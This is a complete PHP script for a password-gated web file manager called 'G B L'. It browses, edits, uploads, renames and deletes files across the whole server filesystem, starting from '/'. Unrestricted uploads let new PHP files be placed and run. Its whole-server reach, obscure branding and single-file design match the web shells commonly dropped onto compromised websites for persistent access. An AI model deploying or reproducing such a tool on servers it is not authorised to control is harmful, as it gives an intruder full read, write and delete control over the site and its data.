<?php
session_start();
date_default_timezone_set('UTC');
 
$PASSWORD_HASH = '$2y$10$dp8FtqlI165GI0gE2IKJHeiuYltSz1aTpBnPqyFXNto.1iEu6vJ9e';
$BASE = '/';
$ROOT = __DIR__;
$MAX_UPLOAD_SIZE = 10 * 1024 * 1024;
 
function csrf_token(){ if(empty($_SESSION['csrf_token'])) $_SESSION['csrf_token']=bin2hex(random_bytes(16)); return $_SESSION['csrf_token']; }
function check_csrf(){ 
    $session_token = isset($_SESSION['csrf_token']) ? $_SESSION['csrf_token'] : '';
    if(empty($_POST['csrf']) || $_POST['csrf'] !== $session_token) {
        die('Geçersiz CSRF token.'); 
    }
}
function h($s){ return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
function is_within_base($base, $path){
    $b = realpath($base); $p = realpath($path);
    if($b===false||$p===false) return false;
    return strpos($p, $b) === 0;
}
 
if(isset($_POST['action']) && $_POST['action']==='login'){
    $pw = $_POST['password'] ?? '';
    if(password_verify($pw, $PASSWORD_HASH)){
        $_SESSION['logged_in'] = true;
        csrf_token();
        header('Location: '.$_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Wrong password.';
    }
}
if(isset($_GET['logout'])){
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}
 
if(empty($_SESSION['logged_in'])){
?><!doctype html><html><head><meta charset="utf-8"><title>G B L</title>
<style>
body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;background:#04080f;color:#c8d8e8;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#070d1a;padding:32px 28px;border-radius:14px;border:1px solid #0e1830;width:100%;max-width:340px;}
.card h2{font-size:15px;font-weight:600;color:#c8d8e8;margin:0 0 4px;}
.card p{font-size:11px;color:#1a4a7a;letter-spacing:4px;text-transform:uppercase;margin:0 0 24px;}
label{display:block;font-size:11px;color:#2a4a6a;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;}
input[type=password]{width:100%;background:#02050c;border:1px solid #0c1628;border-radius:8px;padding:10px 13px;color:#6a90b0;font-size:13px;margin-bottom:20px;outline:none;box-sizing:border-box;transition:border-color .2s;}
input[type=password]:focus{border-color:#0e2a50;}
button[type=submit]{width:100%;background:#081830;border:1px solid #0e2240;border-radius:8px;padding:11px;color:#2a6090;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:.5px;transition:background .2s;}
button[type=submit]:hover{background:#0c1e3a;}
.errmsg{background:#100305;border:1px solid #280a10;border-radius:7px;padding:8px 12px;font-size:12px;color:#a05050;margin-bottom:14px;}
</style>
</head><body><div class="card">
<h2>login</h2><p>G B L</p>
<?php if(!empty($error)) echo '<div class="errmsg">'.h($error).'</div>'; ?>
<form method="post">
  <input type="hidden" name="action" value="login">
  <label>password</label>
  <input type="password" name="password" autocomplete="off">
  <button type="submit">login</button>
</form>
</div></body></html>
<?php
    exit;
}
 
/* ---- CURRENT DIR ---- */
$requested = $_GET['file'] ?? '';
 
if($requested !== '' && $requested[0] === '/'){
    $currentAbs = realpath($requested);
} else {
    $currentAbs = realpath(rtrim($ROOT, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.ltrim($requested, DIRECTORY_SEPARATOR));
}
if(!$currentAbs || !is_dir($currentAbs)) $currentAbs = realpath($ROOT);
if(realpath($BASE) !== '/' && strpos($currentAbs, realpath($BASE)) !== 0) $currentAbs = realpath($BASE);
 
$current = $currentAbs;
 
/* ---- DELETE ---- */
if($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['do'] ?? '')==='delete'){
    check_csrf();
    $abs = realpath($_POST['path'] ?? '');
    if(!$abs || !is_within_base($BASE, $abs)) $msg='Invalid path.';
    elseif(is_file($abs)) $msg = unlink($abs) ? 'Deleted.' : 'Could not delete.';
    elseif(is_dir($abs)) $msg = @rmdir($abs) ? 'Folder deleted.' : 'Could not delete (not empty?).';
    else $msg='Not found.';
}
 
/* ---- RENAME / NEW FOLDER ---- */
if($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['do'] ?? '')==='rename'){
    check_csrf();
    $old = $_POST['old'] ?? '';
    $new = $_POST['new'] ?? '';
    if($old === ''){
        if(is_dir($new)) $msg='Already exists.';
        elseif(mkdir($new, 0755, true)) $msg='Folder created.';
        else $msg='Could not create folder.';
    } else {
        $absOld = realpath($old);
        if(!$absOld || !is_within_base($BASE, $absOld)) $msg='Invalid source.';
        else $msg = @rename($absOld, $new) ? 'Renamed/moved.' : 'Failed.';
    }
}
 
/* ---- UPLOAD ---- */
if($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['do'] ?? '')==='upload'){
    check_csrf();
    $absDest = realpath($_POST['dest'] ?? '');
    if(!$absDest || !is_dir($absDest) || !is_within_base($BASE, $absDest)) $msg='Invalid destination.';
    elseif(!empty($_FILES['file']) && $_FILES['file']['error']===UPLOAD_ERR_OK){
        if($_FILES['file']['size'] > $MAX_UPLOAD_SIZE) $msg='File too large.';
        else {
            $target = $absDest.DIRECTORY_SEPARATOR.basename($_FILES['file']['name']);
            $msg = move_uploaded_file($_FILES['file']['tmp_name'], $target) ? 'Uploaded.' : 'Upload failed.';
        }
    } else $msg='Upload error: '.($_FILES['file']['error'] ?? '?');
}
 
/* ---- SAVE (edit) ---- */
if($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['do'] ?? '')==='save'){
    check_csrf();
    $abs = realpath($_POST['path'] ?? '');
    if(!$abs || !is_within_base($BASE, $abs) || !is_file($abs) || !is_writable($abs)) $msg='Invalid file or not writable.';
    else $msg = file_put_contents($abs, $_POST['content'] ?? '')!==false ? 'Saved.' : 'Save error.';
}
 
/* ---- JUMP ---- */
if($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['action'] ?? '')==='jump'){
    check_csrf();
    $jump = trim($_POST['jump'] ?? '');
    $absJump = realpath($jump);
    if($absJump && is_dir($absJump) && is_within_base($BASE, $absJump)){
        header('Location: ?file='.urlencode($absJump));
        exit;
    } else $msg='Invalid path.';
}
 
/* ---- EDIT (GET) ---- */
$editContent = null;
$editPath = null;
if(isset($_GET['edit']) && $_GET['edit']==='1' && isset($_GET['file'])){
    $abs = realpath($_GET['file']);
    if($abs && is_file($abs) && is_within_base($BASE, $abs)){
        $editContent = file_get_contents($abs);
        $editPath = $abs;
    }
}
 
?><!doctype html>
<html><head><meta charset="utf-8"><title>G B L</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#03060e;--card:#060b18;--border:#0a1428;--accent:#1a5a7a;--accent2:#2a7a9a;--muted:#1e3a5a;--text:#5a8aaa;--text2:#3a6a8a;--ok-bg:#020d08;--ok-border:#061a10;--danger:#a05050;}
*{box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:system-ui,Segoe UI,Roboto,Arial;padding:16px;margin:0;}
.container{max-width:1100px;margin:0 auto;}
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border);}
.brand{font-weight:700;font-size:15px;color:var(--accent2);letter-spacing:1px;}
.card{background:var(--card);padding:16px;border-radius:12px;border:1px solid var(--border);}
.msg{padding:9px 13px;border-radius:8px;margin:0 0 12px;background:var(--ok-bg);color:#1a6040;border:1px solid var(--ok-border);font-size:13px;}
.err{background:#0f0205;color:var(--danger);border-color:#200808;}
.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;}
.btn{background:#060e20;color:#1a5a80;padding:8px 13px;border-radius:8px;border:1px solid #0a1a30;cursor:pointer;font-size:12px;font-weight:600;transition:background .15s;}
.btn:hover{background:#08122a;}
.btn-light{background:transparent;border:1px solid var(--border);color:var(--muted);padding:6px 10px;border-radius:7px;font-size:12px;cursor:pointer;transition:border-color .15s,color .15s;}
.btn-light:hover{border-color:#122038;color:var(--text2);}
.file-item{display:flex;align-items:center;justify-content:space-between;padding:9px 10px;border-radius:8px;margin:5px 0;border:1px solid var(--border);background:#040810;transition:background .15s;}
.file-item:hover{background:#060c1a;}
.file-left{display:flex;align-items:center;gap:10px;}
.icon{width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:7px;font-weight:700;font-size:11px;flex-shrink:0;}
.icon.dir{background:#070f20;color:#1a4060;}
.icon.file{background:#03060e;border:1px solid #08101e;color:#122030;}
.small{font-size:12px;color:var(--muted);}
.controls{display:flex;gap:6px;align-items:center;}
.input{padding:8px 11px;border-radius:8px;border:1px solid #08101e;background:#02050a;color:var(--text);font-size:13px;outline:none;transition:border-color .15s;}
.input:focus{border-color:var(--accent);}
textarea{width:100%;height:380px;background:#02050a;color:var(--text);border-radius:8px;padding:12px;border:1px solid #08101e;font-family:monospace;font-size:13px;outline:none;resize:vertical;}
textarea:focus{border-color:var(--accent);}
a.link{color:var(--accent2);text-decoration:none;}
a.link:hover{color:#4a9aba;}
h4{font-size:13px;color:var(--text2);margin:0 0 10px;font-weight:600;}
hr{border:none;border-top:1px solid var(--border);margin:14px 0;}
.footer{margin-top:14px;color:#0e1e30;font-size:12px;}
.breadcrumb{display:flex;align-items:center;flex-wrap:wrap;gap:2px;font-size:13px;}
.breadcrumb span.sep{color:var(--muted);}
@media(max-width:700px){.row{flex-direction:column}.controls{flex-wrap:wrap}}
</style>
</head><body>
<div class="container">
 
  <div class="header">
    <div class="brand">G - B - L</div>
    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
      <!-- Header breadcrumb (tıklanabilir yol) -->
      <div class="breadcrumb">
        <?php
        $pathParts = explode('/', trim($current, '/'));
        $acc = '';
        foreach($pathParts as $part){
            if($part==='') continue;
            $acc .= '/'.$part;
            $isCur = ($acc === $current);
            $baseLen = strlen(realpath($BASE));
            if(strlen($acc) < $baseLen){
                echo '<span style="color:var(--muted);">'.h($part).'</span><span class="sep">/</span>';
            } elseif($isCur){
                echo '<span style="color:var(--accent2);font-weight:600;">'.h($part).'</span>';
            } else {
                echo '<a class="link" href="?file='.urlencode($acc).'">'.h($part).'</a><span class="sep">/</span>';
            }
        }
        ?>
      </div>
      <a class="link" style="font-size:13px;" href="?logout=1">logout</a>
    </div>
  </div>
 
  <div class="card">
    <?php if(!empty($msg)) echo '<div class="msg">'.h($msg).'</div>'; ?>
    <?php if(!empty($error)) echo '<div class="msg err">'.h($error).'</div>'; ?>
 
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
        <?php
        $parentAbs = dirname($current);
        $atBase = ($current === realpath($BASE) || $parentAbs === $current || $parentAbs === $current);
        if(!$atBase):
        ?>
        <a class="btn-light" href="?file=<?php echo urlencode($parentAbs); ?>"
           style="display:inline-flex;align-items:center;gap:5px;text-decoration:none;font-size:12px;">
          &#8592; up
        </a>
        <?php endif; ?>
        <span class="small"><?php echo h($current); ?></span>
      </div>
      <div class="row">
        <form method="post" style="display:flex;gap:8px;align-items:center;">
          <input type="hidden" name="action" value="jump">
          <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
          <input class="input" name="jump" placeholder="absolute path" value="<?php echo h($current); ?>" style="width:280px;">
          <button class="btn" type="submit">go</button>
        </form>
      </div>
    </div>
 
    <!-- FILE LIST -->
    <?php
    $items = glob($current.DIRECTORY_SEPARATOR.'*') ?: [];
    usort($items, function($a,$b){ return strcasecmp(basename($a),basename($b)); });
    foreach($items as $file):
    ?>
    <div class="file-item">
      <div class="file-left">
        <?php if(is_dir($file)): ?>
          <div class="icon dir">D</div>
          <div>
            <a class="link" href="?file=<?php echo urlencode($file); ?>"><strong><?php echo h(basename($file)); ?>/</strong></a>
            <div class="small">folder</div>
          </div>
        <?php else: ?>
          <div class="icon file">F</div>
          <div>
            <a class="link" href="?file=<?php echo urlencode($file); ?>&edit=1"><strong><?php echo h(basename($file)); ?></strong></a>
            <div class="small"><?php echo $file && filesize($file)>1024 ? round(filesize($file)/1024,1).' KB' : filesize($file).' B'; ?> &mdash; <?php echo date('Y-m-d H:i', filemtime($file)); ?></div>
          </div>
        <?php endif; ?>
      </div>
      <div class="controls">
        <?php if(is_file($file)): ?>
          <form method="post" style="display:inline;">
            <input type="hidden" name="do" value="delete">
            <input type="hidden" name="path" value="<?php echo h($file); ?>">
            <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
            <button class="btn-light" onclick="return confirm('Delete file?')">delete</button>
          </form>
          <button class="btn-light" onclick="location.href='?file=<?php echo urlencode($file); ?>&edit=1'">edit</button>
          <button class="btn-light" onclick="showRename('<?php echo h(addslashes($file)); ?>')">rename</button>
        <?php else: ?>
          <form method="post" style="display:inline;">
            <input type="hidden" name="do" value="delete">
            <input type="hidden" name="path" value="<?php echo h($file); ?>">
            <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
            <button class="btn-light" onclick="return confirm('Delete folder?')">delete</button>
          </form>
          <button class="btn-light" onclick="location.href='?file=<?php echo urlencode($file); ?>'">open</button>
          <button class="btn-light" onclick="showRename('<?php echo h(addslashes($file)); ?>')">rename</button>
        <?php endif; ?>
      </div>
    </div>
    <?php endforeach; ?>
 
    <hr>
 
    <div style="display:flex;gap:18px;flex-wrap:wrap;">
      <!-- New Folder -->
      <div style="min-width:260px;">
        <h4>new folder</h4>
        <form method="post">
          <input type="hidden" name="do" value="rename">
          <input type="hidden" name="old" value="">
          <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
          <input type="text" name="new" class="input" placeholder="<?php echo h($current); ?>/foldername" style="width:100%;">
          <div style="margin-top:8px;"><button class="btn" type="submit">create</button></div>
        </form>
      </div>
 
      <!-- Upload -->
      <div style="min-width:320px;">
        <h4>upload</h4>
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="do" value="upload">
          <input type="hidden" name="dest" value="<?php echo h($current); ?>">
          <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
          <input type="file" name="file" style="color:var(--text);font-size:13px;"><br>
          <small class="small">max <?php echo round($MAX_UPLOAD_SIZE/1024/1024,0); ?> MB</small>
          <div style="margin-top:8px;"><button class="btn" type="submit">upload</button></div>
        </form>
      </div>
 
      <!-- Rename box -->
      <div id="renameBox" style="display:none;min-width:320px;">
        <h4>rename / move</h4>
        <form method="post">
          <input type="hidden" name="do" value="rename">
          <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
          <input type="hidden" name="old" id="renameOld" value="">
          <input type="text" name="new" id="renameNew" class="input" placeholder="new absolute path" style="width:100%;">
          <div style="margin-top:8px;">
            <button class="btn" type="submit">apply</button>
            <button type="button" class="btn-light" onclick="hideRename()">cancel</button>
          </div>
        </form>
      </div>
    </div>
 
    <!-- Editor -->
    <?php if($editContent !== null): ?>
    <div style="margin-top:18px;">
      <h4>editing: <?php echo h($editPath); ?></h4>
      <form method="post">
        <input type="hidden" name="do" value="save">
        <input type="hidden" name="path" value="<?php echo h($editPath); ?>">
        <input type="hidden" name="csrf" value="<?php echo h(csrf_token()); ?>">
        <textarea name="content"><?php echo h($editContent); ?></textarea><br>
        <div style="margin-top:8px;display:flex;gap:8px;">
          <button class="btn" type="submit">save</button>
          <a class="btn-light" href="?file=<?php echo urlencode($current); ?>" style="text-decoration:none;display:inline-flex;align-items:center;">cancel</a>
        </div>
      </form>
    </div>
    <?php endif; ?>
 
  </div>
 
  <div class="footer">G B L</div>
</div>
 
<script>
function showRename(path){
  document.getElementById('renameBox').style.display='block';
  document.getElementById('renameOld').value=path;
  document.getElementById('renameNew').value=path;
  document.getElementById('renameNew').focus();
  window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});
}
function hideRename(){ document.getElementById('renameBox').style.display='none'; }
</script>
</body></html>
